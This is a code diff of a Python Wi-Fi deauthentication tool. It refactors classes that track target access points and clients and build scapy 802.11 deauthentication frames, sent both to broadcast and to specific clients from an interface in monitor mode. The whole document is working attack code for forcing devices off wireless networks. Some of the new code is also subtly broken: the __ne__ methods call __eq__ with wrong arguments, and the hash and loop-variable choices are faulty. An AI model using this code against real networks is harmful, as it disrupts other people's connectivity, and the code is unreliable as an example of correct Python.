@@ -12,37 +12,69 @@ from utils.utils import DEVNULL
 from utils.networkmanager import NetworkCard
 from textwrap import dedent
 
-class BSSID(object):
-    def __init__(self, id, bssid):
+class DeauthAP(object):
+    def __init__(self, id = 0, bssid = None, ssid = None):
         self.id = id
         self.bssid = bssid
-        self.ssid = None
+        self.ssid = ssid
+
+    def __eq__(self, other):
+        return self.bssid == other.bssid
+
+    def __ne__(self, other):
+        return not self.__eq__(self, other)
+
+    def __hash__(self):
+        return hash(self.bssid + self.ssid)
 
 class DeauthClient(object):
-    def __init__(self, id, client_mac, ap_bssid):
+    def __init__(self, id = 0, client_mac = None, ap_bssid = None, ssid = None):
         self.id = id
         self.client_mac = client_mac
         self.ap_bssid = ap_bssid
-        self.ap_ssid = None
+        self.ap_ssid = ssid
+
+    def __eq__(self, other):
+        return (self.client_mac == other.client_mac) and (self.ap_bssid == other.ap_bssid)
+
+    def __ne__(self, other):
+        return not self.__eq__(self, other)
+
+    def __hash__(self):
+        return hash(self.client_mac + self.ap_bssid)
 
 class AirDeauthenticator(object):
 
     def __init__(self, targeted_only=False, burst_count=5):
         self.deauth_running = False
         self.running_interface = None
-        self.channel_lock = Lock()
 
         self._previous_mode = None              # Previous mode to restore network card to
         self._targeted_only = targeted_only     # Flag if we only want to perform targeted deauthentication attacks
         self._burst_count = burst_count         # Number of sequential deuathentication packet bursts to send
-        self.bssids_to_deauth = []              # MAC addresses of APs, used to send deauthentication packets to broadcast
-        self.clients_to_deauth = []             # Pairs clients to their connected AP to send targeted deauthentication attacks
+        self.aps_to_deauth = set()              # MAC addresses of APs, used to send deauthentication packets to broadcast
+        self.clients_to_deauth = set()          # Pairs clients to their connected AP to send targeted deauthentication attacks
 
-    def add_bssid(self, bssid):
-        self.bssids_to_deauth.append(BSSID(len(self.bssids_to_deauth), bssid))
+    def add_ap(self, ap, ssid):
+        deauth_ap = DeauthAP(len(self.aps_to_deauth), ap, ssid)
+        if deauth_ap not in self.aps_to_deauth:
+            self.aps_to_deauth.add(deauth_ap)
 
-    def add_client(self, client_mac, bssid):
-        self.clients_to_deauth.append(DeauthClient(len(self.clients_to_deauth), client_mac, bssid))
+    def add_client(self, client_mac, bssid, ssid):
+        deauth_client = DeauthClient(len(self.clients_to_deauth), client_mac, bssid, ssid)
+        if deauth_client not in self.clients_to_deauth:
+            self.clients_to_deauth.add(deauth_client)
+
+    def del_aps(self, aps = ()):
+        self.aps_to_deauth -= aps
+
+    def del_clients(self, clients = ()):
+        self.clients_to_deauth -= clients
+
+    def del_deauth(self, deauth_list, id):
+        for obj in deauth_list:
+            if str(obj.id) == str(id):
+                deauth_list.remove(obj)
 
     def set_burst_count(self, count):
         self._burst_count = count
@@ -57,9 +89,9 @@ class AirDeauthenticator(object):
         packets = []
 
         if not self._targeted_only:
-            for BSSID in self.bssids_to_deauth:
+            for DeauthAP in self.aps_to_deauth:
                 deauth_packet = RadioTap() / \
-                                Dot11(type=0,subtype=12, addr1="FF:FF:FF:FF:FF:FF", addr2=BSSID.bssid, addr3=BSSID.bssid) / \
+                                Dot11(type=0,subtype=12, addr1="FF:FF:FF:FF:FF:FF", addr2=DeauthAP.bssid, addr3=DeauthAP.bssid) / \
                                 Dot11Deauth(reason=7)
 
                 packets.append(deauth_packet)
@@ -110,8 +142,9 @@ class AirDeauthenticator(object):
 
         self.running_interface = interface
         card = NetworkCard(interface)
-        self._previous_mode = card.get_mode()
-        if self._previous_mode != 'monitor':
+        current_mode = card.get_mode()
+        if current_mode != 'monitor':
+            self._previous_mode = current_mode
             card.set_mode('monitor')
 
         self.deauth_running = True
